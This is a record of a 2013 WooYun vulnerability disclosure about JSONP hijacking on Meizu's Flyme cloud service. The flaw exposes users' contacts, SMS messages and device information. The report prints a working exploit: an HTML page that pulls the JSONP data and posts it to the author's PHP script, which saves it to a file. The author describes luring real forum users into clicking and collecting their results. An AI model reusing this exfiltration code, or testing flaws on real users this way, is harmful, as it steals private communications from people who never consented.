{"id": 14376, "wybug_id": "wooyun-2013-017289", "wybug_title": "魅族获取他人用户通讯录、短信等（已测试成功）", "wybug_corp": "魅族科技", "wybug_author": "八折", "wybug_date": "2013-01-14 11:11", "wybug_open_date": "2013-02-28 11:12", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["用户敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-28：\t细节向公众公开  简要描述： 如题，诱使任意用户点击可获取其通讯录、短信、手机配置信息等等，应有尽有，对http://drops.wooyun.org/papers/42（js hijacking）的一次尝试 详细说明：  魅族flyme云服务功能会备份手机通讯录、短信等到服务器，并可在云端查看。在https://flyme.meizu.com/页面，加载通讯录、短信、手机配置信息等都是Ajax GET获取json，加callback参数通过script引用在用户登录Flyme时就能截取用户这些信息。存在问题页面：\nhttps://flyme.meizu.com/service/uc_contactAct/searchSimpleContact.jsonp\n相关问题链接：\nhttps://flyme.meizu.com/service/uc_contactAct/searchSimpleContact.jsonp?p0=%E5%85%A8%E9%83%A8%E8%81%94%E7%B3%BB%E4%BA%BA&p1=0&_=1357611733951&callback=a%3Dhttps://flyme.meizu.com/service/fm_smsAct/getSmsGroups.jsonp?p0=phone&p1=0&p2=10&_=1358057353920&callback=b%3Dhttps://flyme.meizu.com/service/fm_settingAct/getDeviceInfo.jsonp?_=1358057422226&callback=c%3D\n登陆后打开以上链接，你懂的。   漏洞证明：  漏洞利用演示：1.在魅族社区bbs.meizu.com发贴，诱使用户点击\n\n发了两篇帖子，两篇回复，不到1小时就被管理员删除了，不过还是有用户“侥幸”点击了，不知道是不是管理员自己呐？2.附收到的结果截图及漏洞测试代码\n\n\n\n利用代码(用了jquery.js)：meizu.html\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /></head><body><iframe style=\"display:none\" src=\"https://flyme.meizu.com/index.jsp\"></iframe><script>if(! /\\?a$/.test(location.href)){\tsetTimeout('location.href=location.href+\"?a\"',2000);}</script><script src=\"jquery.js\"></script><script src=\"https://flyme.meizu.com/service/uc_contactAct/searchSimpleContact.jsonp?p0=%E5%85%A8%E9%83%A8%E8%81%94%E7%B3%BB%E4%BA%BA&p1=0&_=1357611733951&callback=a%3D\"></script><script src=\"https://flyme.meizu.com/service/fm_smsAct/getSmsGroups.jsonp?p0=phone&p1=0&p2=10&_=1358057353920&callback=b%3D\"></script><script src=\"https://flyme.meizu.com/service/fm_settingAct/getDeviceInfo.jsonp?_=1358057422226&callback=c%3D\"></script><script>var as=JSON.stringify(a);var bs=JSON.stringify(b);var cs=JSON.stringify(c);$.post('meizu.php',{'a':as,'b':bs,'c':cs,'r':Math.random()});</script></body></html>\n加载iframe并刷新页面，为了用户登陆论坛时也能同时登陆Flyme云服务。meizu.php\n<?php$a=$_POST['a'];$b=$_POST['b'];$c=$_POST['c'];if(!empty($a) || !empty($b) || !empty($c)){\tfile_put_contents('meizu_'.date('Ymd-His').'.txt',$a.\"\\n\\n\".$b.\"\\n\\n\".$c.\"\\n\\n\");}?>\n   修复方案：  不使用callback   版权声明：转载请注明来源 八折@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2013-01-14 13:47 厂商回复： 该漏洞我们已经知悉，并会尽快进行验证处理！谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-14 11:29 |    \t\tqiaoy \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:16        )\t\t \n  前排    \n     2013-01-14 13:07 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  前排．    \n     2013-03-04 16:31 |    \t\tCp0204 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:4        | 著名艺术家)\t\t \n  跟 WooYun: 通过小米账户XSS窃取超私密资料，危害严重 有点像    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}